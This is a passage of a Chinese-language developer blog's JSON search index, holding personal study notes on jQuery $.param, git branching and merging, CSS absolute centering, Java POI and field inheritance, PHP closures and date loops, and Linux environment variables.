PHP.](https://github.com/dg/adminer-custom)\n不過我還是覺得原版看比較順眼\n","tags":["adminer"],"categories":["PHP"]},{"title":"jQuery $.param傳參數小筆記","url":"%2Fblog%2F2018%2F08%2F17%2FjQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98%2F","content":"\n之前我很常在大學自學 jQuery 很常用`$('xxx').serialize()`做表單傳送動作\n不過今天上班同事剛好問 form\n就看到這個`$.param(xxxx,true)`\n好奇這個跟`serialize`哪裡不一樣\n這篇當然要好好補足一下\nPHP 使用上可能需要用到`$.param`\n\n<!--more-->\n\n網路查了一下\n常看到這三個 method 做比較`$.serialize`、`$.serializeArray`和`$.param`\n\n## \\$(\"form\").serialize()\n\n基於`$.param`實作\n寫\\$.ajax 很常用到這個\n其實這個跟`$.param`沒有什麼重要關係\n\n## \\$(\"form\").serializeArray\n\n產生一個 JavaScript 陣列\n\n```json\n[\n  {\n    \"name\": \"fieldName\",\n    \"value\": \"value\"\n  },\n  {\n    \"name\": \"name\",\n    \"value\": \"man\"\n  },\n  {\n    \"name\": \"sex\",\n    \"value\": \"male\"\n  },\n  {\n    \"name\": \"class[]\",\n    \"value\": \"math\"\n  },\n  {\n    \"name\": \"class[]\",\n    \"value\": \"chinese\"\n  }\n]\n```\n\n一直覺得這個 method 有什麼軟用，不過我來一直重覆看文件\n官網有提到\n\n> If the object passed is in an Array, it must be an array of objects in the format returned by .serializeArray()\n> [\n>\n> > { name: \"first\", value: \"Rick\" },\n> > { name: \"last\", value: \"Astley\" },\n> > { name: \"job\", value: \"Rock Star\" }\n> > ]\n\n原來這玩意可以用在這裡(\\$.param)\n\n## \\$.param\n\n竟然`$().serialize()`可以做到我們想要做的事情\n前面有提到`$.param()`就是實作出`$().serialize()`\n\n但我對他第二個參數，比較有興趣\n在開方者工作測試\n\n\\$.param 除了可以吃`$.serializeArray`傳回的陣列以外\n他還能實接對物件做解析\n\n比較需要注意的事情是\n\n```js\nvar myObject = {\n  a: {\n    one: 1,\n    two: 2,\n    three: 3\n  },\n  b: [1, 2, 3]\n};\nvar recursiveEncoded = $.param(myObject);\nvar recursiveDecoded = decodeURIComponent($.param(myObject));\n\nalert(recursiveEncoded); // a%5Bone%5D=1&a%5Btwo%5D=2&a%5Bthree%5D=3&b%5B%5D=1&b%5B%5D=2&b%5B%5D=3\nalert(recursiveDecoded); // a[one]=1&a[two]=2&a[three]=3&b[]=1&b[]=2&b[]=3\n```\n\nphp 程式需要做 form 表單送出的時候，需要用`a[one]=1&a[two]=2&a[three]=3&b[]=1&b[]=2&b[]=3`\n但這時候 myObject 屬性塞`陣列/物件`，jQuery 預設會轉\n\\$.param 接收`物件`的時候，第二個參數就有差了\n遇設是 false，所以寫 php 都不用調整這個參數\n但是 jsp 的就需要了\n\n> 默認的話，traditional 為 false，即 jquery 會深度序列化參數對象，以適應如 PHP 和 Ruby on Rails 框架\n> [jQuery ajax 的 traditional 參數的作用 - i33 的個人空間 - 開源中國](https://my.oschina.net/i33/blog/119506)\n\n```\n$.param(myObject, false)\n```\n\n顯示結果為 `a[one]=1&a[two]=2&a[three]=3&b[]=1&b[]=2&b[]=3`\n\n```\n$.param(myObject, true)\n```\n\n顯示結果為`a=[object+Object]&b=1&b=2&b=3`\n\n**所以不管怎麼用，checkbox name 還是一定要加[]**\n\n## 寫 PHP checkbox 記得一件事\n\n我覺得我還是一定會忘記 XDD\n再寫一次\n\n寫 checkbox 相同 name 的時候，記得在 PHP 變數加個`[]`\nex:\n\n```html\n<input name=\"xxxx[]\" type=\"checkbox\" />\n<input name=\"xxxx[]\" type=\"checkbox\" />\n<input name=\"xxxx[]\" type=\"checkbox\" />\n<input name=\"xxxx[]\" type=\"checkbox\" />\n```\n\n## jQuery.ajaxSettings.traditional = true;\n\n預設做 ajax 動作實候，呼叫`$.param(xxx,true)`會自動帶後面的 true\n但自己寫`$.param`，還是需要手動加(xxx,true)\n\n參考來源：\n[jQuery.param() | jQuery API Documentation](https://api.jquery.com/jQuery.param/)\n[jquery serialize()、serializearray()已经\\$.param 方法 - youxin - 博客园](https://www.cnblogs.com/youxin/p/3891140.html)\n","tags":["form"],"categories":["jQuery"]},{"title":"兩個git repo合併在一起","url":"%2Fblog%2F2018%2F08%2F16%2F%E5%85%A9%E5%80%8Bgit-repo%E5%90%88%E4%BD%B5%E5%9C%A8%E4%B8%80%E8%B5%B7%2F","content":"\n最近接到一個程式修改，原本我以為沒有git\n但是作完的時候，副理跟我說需要盒併他的git\n網路找到相關資料，就結論而且不時適合做merge\n\n\n<!--more-->\n兩個git該如何合併呢?\n[处理合并冲突](https://www.git-tower.com/learn/git/ebook/cn/command-line/advanced-topics/merge-conflicts)\n[git - 为什么要先commit，然后pull，最后再push？而不是commit然后直接push？ - SegmentFault 思否](https://segmentfault.com/q/1010000009549291)\n\n[Is it possible to cherry-pick a commit from another git repository? - Stack Overflow](https://stackoverflow.com/questions/5120038/is-it-possible-to-cherry-pick-a-commit-from-another-git-repository)\n\n1. add remote xxx url\n2. git fetch xxx\n3. git checkout -b ooo xxx/master\n4. 可以做merge動作(但是可能會有很多衝突)\n\n事後想想，應該我直接`git clone 對方git`\n做合併應該比較快\n就依對方做commit就好","tags":["merge"],"categories":["Git"]},{"title":"CSS position:absolute 垂直置中妙用","url":"%2Fblog%2F2018%2F08%2F15%2FCSS-position-absolute-%E5%9E%82%E7%9B%B4%E7%BD%AE%E4%B8%AD%E5%A6%99%E7%94%A8%2F","content":"\n最近發現HTML tag `dialog`屬性可以用了\n當下好奇怎麼可以使用??\n當下好奇瀏覽器怎麼排排板的\n發現原來是用absolute日上margin可以這樣置中\n\n<!--more-->\n\n\nPS: 目前Firefox 53裡的`about:config`需要設定`dom.dialog_element.enabled`為true\n才能完整用js操作\n[HTMLDialogElement.returnValue - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/HTMLDialogElement/returnValue)\nhttps://segmentfault.com/a/1190000003820437#articleHeader9\n\n\n[html - Why does \"position: absolute; left: 0; right: 0; width: XYpx; margin: 0 auto\" actually center? - Stack Overflow](https://stackoverflow.com/questions/29261595/why-does-position-absolute-left-0-right-0-width-xypx-margin-0-auto-ac)\n[css - div的position:absolute；left:0;right:0;margin:0 auto;为什么可以居中？ - SegmentFault 思否](https://segmentfault.com/q/1010000008325121)\n[CSS规范 > 10 视觉格式化模型详述 Visual Formatting Model Details - HaoyCn's Blog - SegmentFault 思否](https://segmentfault.com/a/1190000003820437#articleHeader9)\n```css\npostition:absolute; \nleft:0px;\nright:0px;\n```\n要加`margin auto;`\n\n但為什麼這樣就能置中呢?\n網路找了一下，其實滿不好找的(但還是有的)...\n[CSS 垂直置中的七個方法 - OXXO.STUDIO](http://www.oxxostudio.tw/articles/201502/css-vertical-align-7methods.html)\n\n不過...為什麼這樣能置中?我就Google找了一下中文文件(英文太菜了>.<)\n\n這篇有講到[css - 絕對定位div寬度如何自適應內容。 - SegmentFault 思否](https://segmentfault.com/q/1010000010907551)\n\n\n### containing block\n> 怎么确定一个元素的containing block，由position属性确定：\n> 1. static(默认的)/relative：简单说就是它的父元素的内容框（即去掉padding的部分）\n> 2. absolute: 向上找最近的定位为absolute/relative的元素\n> 3. fixed: 它的containing block一律为根元素(html/body)，根元素也是initial containing block\n[CSS 中 block-level boxes、containing block、block formatting context 三者之间的区别和联系是怎样的？ - 知乎](https://www.zhihu.com/question/20086234)\n\n難怪之前會覺得position設定width height百分比怪怪的，看到這個終於解開我心中疑惑\n\n\n## inline 裡面element使用position位置\n[Containing Block(包含块模型) - 简书](https://www.jianshu.com/p/c67a7c1cbb00)\n[CSS direction属性简介与实际应用 « 张鑫旭-鑫空间-鑫生活](http://www.zhangxinxu.com/wordpress/2016/03/css-direction-introduction-apply/)\n  \n\n[CSS规范 > 10 视觉格式化模型详述 Visual Formatting Model Details - HaoyCn's Blog - SegmentFault 思否](https://segmentfault.com/a/1190000003820437#articleHeader9)\n那麼該收縮適應寬度即：min(max(首選最小寬度,可用寬度),首選寬度)。\n> 3個寬度說明：\n    首選寬度：按照不自動斷行的方式排版，取得的內容寬度（可以理解為不受容器限制自動排列的寬度就是你想要的效果）\n    首選最小寬度：calculate the preferred minimum width, e.g.,by trying all possible line breaks（我理解就是在1的情況下你把容器不斷縮小到不能換行，一般是單個文字的寬度）\n    可用寬度：就是把right設置為0，計算出的width\n\n## 更多詳細要了解的\n(未深入了解的，吸收不能>.<，之後踩雷再研究)\n[深入理解CSS绝对定位absolute - 小火柴的蓝色理想 - 博客园](http://www.cnblogs.com/xiaohuochai/p/5312917.html)\n裡面有一些觀念，\n1.position:absolute遇到float:right，浮動(float)就會失效。但是relative就沒有這個問題\n2.position:absolute，parent並不會算到子原素absolute的寬度、高度\n還有很多\n\n[CSS绝对定位的应用 - 小火柴的蓝色理想 - 博客园](http://www.cnblogs.com/xiaohuochai/p/5315942.html)\n左半邊翻圖範例很有意思\n\n[CSS进阶——绝对定位元素的宽高是如何定义的 - 掘金](https://juejin.im/post/5935142e2f301e006b0a7b55)\n>根元素（在HTML文档中即<html>元素）所在的包含块即是初始包含块，对于浏览器来说：初始包含块的大小即是视口的大\n>\n這個雷，我還真的不知道...\n想說怎麼不是在最底端呢....\n\n\n[由布局学习CSS——从两列布局来看position：absolute的用法 - shawnXiao - 博客园](http://www.cnblogs.com/sc-xx/archive/2012/03/28/2422371.html)\n\nposition:absolute\n\n## 隨意寫的範例loading\nhttps://jsbin.com/diyavuyihi/1/edit?html,css,output\n\n","tags":["absolute"],"categories":["CSS"]},{"title":"JAVA poi操作excel文件","url":"%2Fblog%2F2018%2F08%2F15%2FJAVA-poi%E6%93%8D%E4%BD%9Cexcel%E6%96%87%E4%BB%B6%2F","content":"\n最近做報表用到POI\n有踩到一個雷，由於真的不是很熟POI\n所以趕快來記我踩的雷\n\n<!--more-->\n\n[poi操作excel文件 - CSDN博客](https://blog.csdn.net/caihaijiang/article/details/6381948)\n[HSSF、XSSF和SXSSF区别以及Excel导出优化 - PC君 - 博客园](http://www.cnblogs.com/pcheng/p/7485979.html)\n\n可能踩雷，未知`java.lang.IllegalArgumentException: Sheet index (-1) is out of range (0..2)`問題\n經查詢是這段問題\n`workbook.setSheetName( sheetIndex , userType == 0 ? label : label + xxxxxx);`\n```java\n//下面是原寫法\n//sheet = workbook.getSheet(\"XXXXX\");\n\n//下面是修改寫法\nsheet = workbook.getSheetAt(sheetIndex);\n\nSystem.out.println(\"sheetIndex:\" + workbook.getSheetIndex(sheet));\n\nString sheetName = userType == 0 ? label : label + xxxxxx;\n// 按不同方案別命名Sheet\nworkbook.setSheetName(sheetIndex, sheetName);\n\nSystem.out.println(\"sheetName:\" + sheetName);\n\n// 按不同方案別命名Sheet\nworkbook.setSheetName( sheetIndex , userType == 0 ? label : label + xxxxxx);\n```\n\ncreateRow  會覆蓋當下row\n```java\n\n        // 由於資料過少的話，temple Excel欄位header會印出來，所以目前先用小於五筆資料，新增5列資料去覆蓋\n        if (arrayList.size() <= 5)\n        {\n            for (int i = 0; i < arrayList.size(); i++)\n            {\n                int idxrow = i + 1 + arrayList.size();\n                XSSFRow row1 = sheet.createRow(idxrow);\n\n                // 固定內容部分\n                XSSFCell cell_1 = row1.createCell(0);\n                cell_1.setCellType(XSSFCell.CELL_TYPE_STRING);\n                cell_1.setCellValue(\"\");\n                XSSFCell cell_2 = row1.createCell(1);\n                cell_2.setCellType(XSSFCell.CELL_TYPE_STRING);\n                cell_2.setCellValue(\"\");\n                XSSFCell cell_3 = row1.createCell(2);\n                cell_3.setCellType(XSSFCell.CELL_TYPE_STRING);\n                cell_3.setCellValue(\"\");\n                // 變動欄位\n                XSSFCell cell_4 = row1.createCell(3);\n                cell_4.setCellType(XSSFCell.CELL_TYPE_STRING);\n                cell_4.setCellValue(\"\");\n                XSSFCell cell_5 = row1.createCell(4);\n                cell_5.setCellType(XSSFCell.CELL_TYPE_STRING);\n                cell_5.setCellValue(\"\");\n                XSSFCell cell_6 = row1.createCell(5);\n                cell_6.setCellType(XSSFCell.CELL_TYPE_STRING);\n                cell_6.setCellValue(\"\");\n\n            }\n```\n\n[POI ，Java 操作 Excel 实现行的插入（insert row） - CSDN博客](https://blog.csdn.net/daemon_boy/article/details/1786384)\n[POI实现插入一行操作，就像office excel插入一行的操作 - cai555 - ITeye博客](http://cai555.iteye.com/blog/202963)\n[NPOI 插入行[转] - kingang - 博客园](https://www.cnblogs.com/kingangWang/archive/2011/08/31/2161319.html)\n[Java POI(第一讲):POI中HSSF用法大全-进击的程序猿-51CTO博客](http://blog.51cto.com/zangyanan/1837229)\n\n\n\n\n好想寫WEB orz.......","tags":["excel"],"categories":["Java"]},{"title":"java method 類別成員(class member) 繼承踩雷","url":"%2Fblog%2F2018%2F08%2F14%2Fjava-method-%E9%A1%9E%E5%88%A5%E6%88%90%E5%93%A1-class-member-%E7%B9%BC%E6%89%BF%E8%B8%A9%E9%9B%B7%2F","content":"\n這篇先記錄最近改報表所踩到雷\n一直以為我覺得 class member 也可以做 java Overwrite\n但 overwrite 好像是指 method\n在做繼承方發一想不到事情\n\n<!--more-->\n\n```java=\npublic class A{\n    int usertype = 0;\n    public void ok(){\n        System.out.println(usertype);\n    }\n    public static void main(String args[]) {\n        C c = new C();\n        c.ok();\n    }\n}\n\nclass B extends A{\n    // int usertype = 2;\n    B(){\n        usertype = 2;\n    }\n}\n\nclass C extends B{\n    // int usertype = 3;\n    C(){\n        usertype = 3;\n    }\n}\n\n```\n\n結果印出應該是 3\n\n但是把 usertype=2 跟 usertype=3 前面注解拿掉\n印出來的東西會是`0`\n這個雷...\n\n做後原本想做 js 做做看\n\nJS class 不能用 class member...\n發現 typescript 也不行\n可能真的在 class member 轉 function 行不通\n\n又好奇試試 PHP\n結果發現跟 JAVA 完全不一樣的結果\n\nPHP\n\n```php\n<?php\nclass A{\n    public $a = 1;\n    public function ok(){\n        echo $this->a;\n    }\n}\n\nclass B extends A{\n    public $a =2;\n}\n\nclass C extends B{\n    public function __construct()\n    {\n        $a =3;\n    }\n}\n\n\n$o = new C();\n$o->ok();\n//print 3\n```\n\nPHP class 比較像 JAVA，但結果不一樣...，我感到意外\n不過...抽象類別 裡面方法不能用抽象 function\n詳細[抽象類別（Abstract Class） · PHP 學習筆記](https://kejyuntw.gitbooks.io/php-learning-notes/class/abstract-class.html)\n\npython,golang 我就不試了 orz\n\n[D2:［Java］類別的繼承（基本範例解說） - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10184771)\n\n### 2019-02-21\n\n今天剛好做 PHP 有關 class，突然想到 Java 之前遇到的問題還沒有理解為什麼\n\n感覺`this`是參照原本 method 那一層的(這一點跟 PHP self 很像，\\$this 是實例物件)\n所以一直抓到`父層 A`，沒有解決抓到在`C`\n這解決方法除了寫在建構式，寫在子層`static`也能解決\n\n> 我原先的錯誤想法\n> 在想是因為 extends，所以父層 function 複製到子層那邊去\n> 其實用參照(reference)的方法想就很好懂了\n\n```java\nclass Son extends Dad {\n    static {\n       me = 'son';\n    }\n}\n```\n\n[inheritance - Is there a way to override class variables in Java? - Stack Overflow](https://stackoverflow.com/questions/685300/is-there-a-way-to-override-class-variables-in-java)\n\n難怪最近看到有一個程式\n宣告 class 裡面的變數\n都不會直接給值，都寫在 `constructor`\n\n也許子層不需要再重新宣告父層有的變數\n複寫都在`constructor`可能會比較好\n這可能是最好的良好習慣\n\n參考來源:\n\n- [關於 this](https://openhome.cc/Gossip/JavaGossip-V1/AboutThis.htm)\n- [this 與 final](https://openhome.cc/Gossip/Java/Lambda-this-final.html)\n- [通过 static 关键词来实现 late static binding（静态调用绑定）-pilishen.com,做全球最好的实战教程](http://www.pilishen.com/posts/php-late-static-bindings-in-laravel)\n- [繼承](https://programming.im.ncnu.edu.tw/J_Chapter6.htm)\n- [[java 程式筆記]建構子 Constructor - 觀念與例題研究 @ 貓羽的文字日誌 :: 痞客邦 ::](http://whitecat2.pixnet.net/blog/post/56375979-%5Bjava%E7%A8%8B%E5%BC%8F%E7%AD%86%E8%A8%98%5D%E5%BB%BA%E6%A7%8B%E5%AD%90constructor---%E8%A7%80%E5%BF%B5%E8%88%87%E4%BE%8B%E9%A1%8C%E7%A0%94)\n- [inheritance - Accessing inherited class variables in java - Stack Overflow](https://stackoverflow.com/questions/8763271/accessing-inherited-class-variables-in-java)\n- [JWorld@TW Java 論壇 - 建構子??](https://www.javaworld.com.tw/jute/post/view?bid=29&id=181644)\n- [inheritance - Is there a way to override class variables in Java? - Stack Overflow](https://stackoverflow.com/questions/685300/is-there-a-way-to-override-class-variables-in-java)\n- [override - Overriding member variables in Java - Stack Overflow](https://stackoverflow.com/questions/10722110/overriding-member-variables-in-java)\n- [JAVA](http://www.codedata.com.tw/book/java-basic-source/ch11-3.htm)\n- [[PHP 觀念]self 和\\$this 的差異 @ 麥克的學習紀錄 :: 痞客邦 ::](http://miggo.pixnet.net/blog/post/30799978-%5Bphp%E8%A7%80%E5%BF%B5%5Dself%E5%92%8C%24this%E7%9A%84%E5%B7%AE%E7%95%B0)\n","tags":["class"],"categories":["寫程式一些事"]},{"title":"PHP 閉包 function() use (xxx){}","url":"%2Fblog%2F2018%2F08%2F12%2FPHP-%E9%96%89%E5%8C%85-function-use-xxx%2F","content":"\n\n一直都不是看很懂，PHP閉包語法要怎麼看\n之前有學JavaScript閉包，但不是很明白PHP閉包跟它插在哪裡\n不過最近有爬到這篇\n<!--more-->\n\n```php\n//输出: This is a closure use string value lazy bind, msg is: Hello, everybody.<br />/n  \n//换一种引用方式, 我们使用引用的方式来use  \n//可以发现这次输出是闭包定义后的值...  \n//这个其实不难理解, 我们以引用方式use, 那闭包use的是$msg这个变量的地址  \n//当后面对$msg这个地址上的值进行了改变之后, 闭包内再输出这个地址的值时, 自然改变了.  \n$msg = \"Hello, everyone\";  \n$callback = function () use (&$msg) {  \n    print \"This is a closure use string value lazy bind, msg is: $msg. <br />/n\";  \n};  \n$msg = \"Hello, everybody\";  \ncallback($callback);  \n```\n\n這個案例有點跟JavaScript閉包高達相似度\n也能寫出跟JS閉包一樣的計時器\n參考來源：\n[php 5.3新增的闭包语法介绍function() use() {} - CSDN博客](https://blog.csdn.net/lgg201/article/details/6127564)\n","tags":["閉包"],"categories":["PHP"]},{"title":"linux 設定環境變數","url":"%2Fblog%2F2018%2F08%2F09%2Flinux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%2F","content":"\n最近同事在測試環境玩GO語言\n他好像在linux沒法執行編譯程式\n[golang 跨平台編譯——go 在windows上編譯Linux平台的程序（Cross Compilation from Windows to Linux/Ubuntu） - 牛頓的小腦 - 博客園](https://www.cnblogs.com/oxspirt/p/7072818.html)\n他是在window編譯完後在linux上面不能跑\n後來我發現他沒有執行`chmod a+x hello`\n所以不能執行\n最後他試著在linux上面放go語言\n設定環境變數有點況狀\n當然要趁著這個機會好好了解XD\n\n<!--more-->\n\n有設定`export PATH=$PATH:/xxx/go/bin`\n但是登出後  就會被清除\n\n來自[鳥哥的 Linux 私房菜 -- 第十章、認識與學習BASH](http://linux.vbird.org/linux_basic/0320bash.php#fig10.2.3)\n\n要永久存放參數，可以放在`~/bash_profile`\n假如要所有人登入能跑的話可以放在`/etc/profile`\n詳細可參考鳥哥裡面的圖片[shell執行順序](http://linux.vbird.org/linux_basic/0320bash.php#fig10.4.1)\n\nsource\n之前寫超級終端機文章有寫到source\n[超級終端機 zplug | 程式狂想筆記](https://malagege.github.io/blog/2018/01/22/logdown/2018-01-22-5198665/)\n\n>由於 /etc/profile 與 ~/.bash_profile 都是在取得 login shell 的時候才會讀取的設定檔，所以， 如果你將自己的偏好設定寫入上述的檔案後，通常都是得登出再登入後，該設定才會生效。那麼，能不能直接讀取設定檔而不登出登入呢？ 可以的！那就得要利用 source 這個指令了！\n利用 source 或小數點 (.) 都可以將設定檔的內容讀進來目前的 shell 環境中！ 舉例來說，我修改了 ~/.bashrc ，那麼不需要登出，立即以 source ~/.bashrc 就可以將剛剛最新設定的內容讀進來目前的環境中！很不錯吧！還有，包括 ~/bash_profile 以及 /etc/profile 的設定中， 很多時候也都是利用到這個 source (或小數點) 的功能喔！\n[鳥哥的 Linux 私房菜 -- source ：讀入環境設定檔的指令](http://linux.vbird.org/linux_basic/0320bash.php#source)\n\nenv\n看環境變數用\n\n## cmd1 && cmd2與  cmd1 ||cmd2\n之前有寫過[連續打指令&& 與;差別 | 程式狂想筆記](https://malagege.github.io/blog/2018/03/26/logdown/2018-03-26-7062187/)\n\n### cmd1 && cmd2\n1. 若 cmd1 執行完畢且正確執行($?=0)，則開始執行 cmd2。\n2. 若 cmd1 執行完畢且為錯誤 ($?≠0)，則 cmd2 不執行。\n\n### cmd1 ||  cmd2\n1. 若 cmd1 執行完畢且正確執行($?=0)，則 cmd2 不執行。\n2. 若 cmd1 執行完畢且為錯誤 ($?≠0)，則開始執行 cmd2。\n\n來自[鳥哥的 Linux 私房菜 -- $? (指令回傳值) 與 && 或 ||](http://linux.vbird.org/linux_basic/0320bash.php#fig10.5.2)\n\n$?是指令回傳錯誤碼\n&& cmd1執行錯誤就不會執行cmd2\n**|| cmd1執行錯誤就會執行cmd2，相反cmd1執行正確cmd2就不會執行**\n這個好特別!!!\n","tags":["env"],"categories":["Linux"]},{"title":"git 刪除分支commit會留著?!","url":"%2Fblog%2F2018%2F08%2F09%2Fgit-%E5%88%AA%E9%99%A4%E5%88%86%E6%94%AFcommit%E6%9C%83%E7%95%99%E8%91%97%2F","content":"\n最近公司master merge一直出問題\n有一直想到feature一直建立分支，需求爆多那不分支不是之後會越積越多\n一直找不到答案\n最後在[30 天精通 Git 版本控管 (17)：關於合併的基本觀念與使用方式 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10138437)找到答案\n>刪除不必要的分支\n假設我們 feature 分支還會持續開發新功能，所以可以暫時將它留著，讓後續還能繼續切換到 feature 分支繼續開發。\n如果你確定用不到的話，可以用 git branch -d feature 刪除該分支。\n在 Git 裡，只要沒有執行過「合併」的分支，都不能用上述指令進行刪除，必須改用 git branch -D feature 才能刪除該分支。\n\n<!--more-->\n\n(在有merge過的分支)\n刪除分支commit會留著\n想建立回來刪除的branch\n可以用checkout到之前的commit\n\n(在沒有merge過的分支)\n刪除分支\n`git log --oneline --all`\n沒有看到commit   囧\n我原本實驗以為是真的把commit刪掉\n但是看[【狀況題】不小心把還沒合併的分支砍掉了，救得回來嗎？ 為你自己學 Git](https://gitbook.tw/chapters/branch/restore-deleted-but-unmerged-branch.html)\n說明commit 不會馬上被刪掉，但有機會之後被git垃圾清除\n[【常見問題】合併過的分支要留著嗎？ 為你自己學 Git](https://gitbook.tw/chapters/branch/about-merged-branch.html)\n我覺得是我需求完成結案就刪吧\n又有需求再開新branch\n\n使用git branch\n建出來的branch會在你現在的commit\n真的是很神奇東西\n\n話說git我原本以為他是zip觀念\n刪除整個commit都會不見\n現在感覺他跟指標(point)很像(事後查到[【狀況題】不小心把還沒合併的分支砍掉了，救得回來嗎？ 為你自己學 Git](https://gitbook.tw/chapters/branch/restore-deleted-but-unmerged-branch.html)裡面有寫到)\n等等，他好像跟tag屬性重疊XD\n[關於版本控管系統的分支(branch)與標籤(tag)的區別 | Kenmingの鮮思維](https://www.kenming.idv.tw/about_vc_branch_tag_difference/)這邊有簡單介紹\n用法不太一樣\n\n但等等...怎麼知道有哪些branch已經合併\n不可能用`gitk --all`肉眼看圖\n爬文有找到[Git - 分支的管理](https://git-scm.com/book/zh-tw/v1/Git-%E5%88%86%E6%94%AF-%E5%88%86%E6%94%AF%E7%9A%84%E7%AE%A1%E7%90%86)\n查詢合併分支`git branch --merged`\n查詢沒有合併分支`git branch --no-merged`\n\n\n[建立 / 刪除分支 · Git](https://zlargon.gitbooks.io/git-tutorial/content/branch/create_delete.html)\n[delete git branch local and remote (刪除本地跟遠端 git branch) | louie_lu's blog](https://blog.louie.lu/2016/08/26/delete-git-branch-local-and-remote-%e5%88%aa%e9%99%a4%e6%9c%ac%e5%9c%b0%e8%b7%9f%e9%81%a0%e7%ab%af-git-branch/)\n[怎么用git clone 远程的所有分支 - 简书](https://www.jianshu.com/p/0fe715a7fbb3)","tags":["git"],"categories":["Git"]},{"title":"git merge master 常常遇到衝突的雷","url":"%2Fblog%2F2018%2F08%2F09%2Fgit-merge-master-%E5%B8%B8%E5%B8%B8%E9%81%87%E5%88%B0%E8%A1%9D%E7%AA%81%E7%9A%84%E9%9B%B7%2F","content":"\n最近之前學會fetch 跟merge 線上git分支\n但最近開發偶爾會遇到衝突\n而且還是幫我推git的人到正式環境裡面同樣我改的commit衝突(他用cherry-picker)\n突然覺得我有什麼觀念不對\n\n<!--more-->\nPS:公司只有用master一條\n\n就請叫我同事，他怎麼避免這個問題\n他說他會開分支，但自己分支完不會合併到自己master上面\n然後master不要做任何commit，他只做更新動作\n分支都從master出來，改程式都需要在自己建立的分支\n改完一樣給推git的人commit id\n\n他更新完，就可以更新(pull) remote master分支\n這樣不會衝突\n\nPS:  cherry-pick出來的commit會不一樣\n\n雖然這不是gitflow，但還是先了解git\n知道使用方式才是正確的\n等下次有機會使用新的專案\n可以自己用用看\n[Git怎麼這麼難用？Git Flow + 好習慣 = 不再苦惱 – Kuma老師的軟體工程教室 – Medium](https://medium.com/kuma%E8%80%81%E5%B8%AB%E7%9A%84%E8%BB%9F%E9%AB%94%E5%B7%A5%E7%A8%8B%E6%95%99%E5%AE%A4/%E5%9F%BA%E7%A4%8E-git-flow-%E5%B7%A5%E4%BD%9C%E6%B3%95-fa50b1dddc4f)\n\n\n最後還煩腦commit message要怎麼寫才比較不會亂\n很迷茫的去看vscode裡面的git，裡面分支好多又好亂(可能是我不會看)\nGoogle有爬到好文[如何寫一個 Git Commit Message | louie_lu's blog](https://blog.louie.lu/2017/03/21/%E5%A6%82%E4%BD%95%E5%AF%AB%E4%B8%80%E5%80%8B-git-commit-message/)\n裡面說可以去看linux和git\nlinux的git好大\n所以我只看git\ngit分支不多，會看到很多一點做merge\n對我而言是整齊的~~亂~~XD\n\nGIT真的可以用很活，但是用不好感覺很容易爆炸\n","tags":["git"],"categories":["Git"]},{"title":"常搞錯GIT觀念(for me)","url":"%2Fblog%2F2018%2F08%2F09%2F%E5%B8%B8%E6%90%9E%E9%8C%AFGIT%E8%A7%80%E5%BF%B5-for-me%2F","content":"\n先留個常忘記GIT觀念\n以免忘記XD\n\n* 常常最後修改檔案，做git add。但再次異動也要再做`git add`動作\n* 剛建立branch，兩個branch都在同一條上面(應該說是同一個點)\n* `git add` 要怎麼取消\ngit reset HEAD\nOR\ngit checkout -- filename\n* git branch要怎麼修改名稱\ngit branch -m oldName newName\n* 新分之要先設好預設的remote\ngit  --set-upstream-to origin/newName\n[git修改分支名称 - 简书](https://www.jianshu.com/p/cc740394faf5)\n* 分支是point指標概念 (可以看上面第二點)\n* 分支刪除掉commit不會不見\n* 刪除沒有合並的分支，`gitk`commit是看不到的，但他過很久會進入git垃圾回收\n* 刪除合並的分支，`gitk`commit還是回流下來\n* master,develop盡量用merge，一個需求開一個feature，然後完成可以與develop做合併(可參考gitflow)\n* `git remote`有點像網路上的git分支，fetch完可以在與本地做merge動作\n* 不同git來源也能加入別的git repo(git remote add xxx http://xxxx)\n\n不支援大小寫\nGit 修改檔名大小寫\n$ git config core.ignorecase false\n$ git mv -f abc.php Abc.php\n[XYZ的筆記本: Git 修改檔名大小寫](https://xyz.cinc.biz/2016/01/git-rename-case-sensitive.html)\n","tags":["git"],"categories":["Git"]},{"title":"php for迴圈跑date+1天運算記錄","url":"%2Fblog%2F2018%2F08%2F05%2Fphp-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84%2F","content":"\n最近剛好做要依日期做for迴圈\n就試著寫寫看\n```php\n<?php\nfor ($now_date = $first_day; $now_date <= $last_day; $now_date = date('Y-m-d', strtotime(\"$now_date +1 DAY\"))){\n    ...    \n}\n```\n寫完覺得寫出還滿實用的東西\nGoogle爬一下有什麼解法\n瞬間覺得我的code是垃圾orz\n\n<!--more-->\n\n## Stack Overflow寫法\n\n```php\n<?php\n$begin = new DateTime('2010-05-01');\n$end = new DateTime('2010-05-10');\n\n$interval = DateInterval::createFromDateString('1 day');\n$period = new DatePeriod($begin, $interval, $end);\n\nforeach ($period as $dt) {\n    echo $dt->format(\"l Y-m-d H:i:s\\n\");\n}\n```\n[I have 2 dates in PHP, how can I run a foreach loop to go through all of those days? - Stack Overflow](https://stackoverflow.com/questions/3207749/i-have-2-dates-in-php-how-can-i-run-a-foreach-loop-to-go-through-all-of-those-d)\n\n\n## 官網範例\n\n```php\n<?php\n\n$begin = new DateTime( '2012-08-01' );\n$end = new DateTime( '2012-08-31' );\n$end = $end->modify( '+1 day' );\n\n$interval = new DateInterval('P1D');\n$daterange = new DatePeriod($begin, $interval ,$end);\n\nforeach($daterange as $date){\n    echo $date->format(\"Ymd\") . \"<br>\";\n}\n?>\n```\n\n感覺實務上還是竟量用DateTime()物件\nmodify竟然也有做時間加總運算\nDatePeriod可以做到日期跑一遍\n真的很方便\n\n\n## DateInterval\n[PHP: DateInterval - Manual](http://php.net/manual/zh/class.dateinterval.php)\nDateInterval可以做時間之間運算\n使用DateTime裡面的add/sub\n最神的還能用在diff\n算兩個之間差\n詳細可以再看看[PHP: DateTime - Manual](http://php.net/manual/zh/class.datetime.php)裡面\n\n裡面爬到DateInterval沒有負的時間\n裡面神人有寫\n```php\n<?php\n\n    class DateRange extends ArrayIterator\n    {\n\n        protected $oDate = null;\n        protected $oStartDate = null;\n        